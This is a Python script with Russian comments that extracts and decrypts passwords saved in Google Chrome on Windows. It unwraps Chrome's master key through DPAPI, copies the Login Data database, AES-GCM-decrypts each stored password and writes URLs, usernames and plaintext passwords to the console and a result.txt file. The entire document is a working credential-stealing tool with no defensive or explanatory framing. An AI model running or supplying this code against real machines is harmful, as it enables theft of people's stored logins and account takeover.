import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'] )
CHROME_PATH_LOGIN_DATA = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data" % os.environ['USERPROFILE'] )


def get_secret_key():
    try:
        with open( CHROME_PATH_LOCAL_STATE, 'r', encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)


        secret_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        secret_key = secret_key[5:] # убираем 'DPAPI' из строки
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]

        return secret_key

        

    except:
        print("[-] Secret key cannot be found.")
        return None
        


    

def decrypt_password(ciphertext, secret_key):
    try:
        init_vector = ciphertext[3:15]

        encrypted_pass = ciphertext[15:-16]


        # Расшифровывавем
        cipher = AES.new(secret_key, AES.MODE_GCM, init_vector)        
        decrypted_pass = cipher.decrypt(encrypted_pass)        
        decrypted_pass = decrypted_pass.decode()

        return decrypted_pass

    except:
        print("[-] Unable to decrypt password.")
        return None

def get_db_connection(path):
    try:
        shutil.copy2(path, "wow.db")

        return sqlite3.connect("wow.db")
    except:
        print("[-] Chrome database cannot be found.")
        return ''
        
     


        

if __name__ == '__main__':
    try:
        print('\n')
        output_file = open("result.txt", "w")
        
        secret_key = get_secret_key()

        conn = get_db_connection(CHROME_PATH_LOGIN_DATA)

        if(secret_key and conn):
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for index, login in enumerate(cursor.fetchall()):
                url = login[0]
                username = login[1]
                ciphertext = login[2]
                if(url!="" and username!="" and ciphertext!=""):
                    
                    decrypted_pass = decrypt_password(ciphertext, secret_key)
                    
                    print("URL: %s\nUser Name: %s\nPassword: %s\n" % (url, username, decrypted_pass) )
                    output_file.write("URL: %s\nUser Name: %s\nPassword: %s \n\n" % (url, username, decrypted_pass) )
                   

            cursor.close()
            conn.close()
            os.remove("wow.db")
            output_file.close()
    except:
        print("[-] WTF Error.")
